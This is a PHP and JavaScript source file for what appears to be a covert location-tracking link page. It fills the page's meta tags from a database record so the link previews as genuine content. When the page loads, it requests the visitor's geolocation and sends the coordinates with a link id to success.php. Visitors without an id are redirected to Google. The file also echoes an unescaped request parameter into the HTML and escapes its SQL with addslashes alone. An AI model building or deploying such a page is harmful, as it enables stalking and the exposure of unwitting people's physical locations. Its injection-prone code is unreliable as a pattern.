<?php
include'configue.php';
if(isset($_GET['ids'])){
  $ids = addslashes($_GET['ids']);
  $sqli = mysqli_query($koneksi, "SELECT * FROM links WHERE ids='$ids'");
  $fatch = mysqli_fetch_array($sqli);


?>
<!DOCTYPE html>
<html>
<head>
<title><?php echo $fatch['title']?></title>
    <meta name="description" content="<?php echo $fatch['deskripsi']?>">
    <meta name="keywords" content="<?php echo $fatch['title']?>">
    <meta name="author" content="<?php echo $fatch['author']?>">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body onload="getLocation()">
<p id="demo"></p>
<p id="<?php echo $ids; ?>" class="hide" style="color:white;"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  var location = position.coords.latitude + ', ' + position.coords.longitude;
  var ids = document.getElementsByClassName("hide")[0].id;
  
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
      }
    };
    xmlhttp.open("GET","success.php?id="+location+"&ids="+ids,true);
    xmlhttp.send();
  
}
</script>
<?php }else{
  header('location:https://www.google.com');
} ?>
</body>
</html>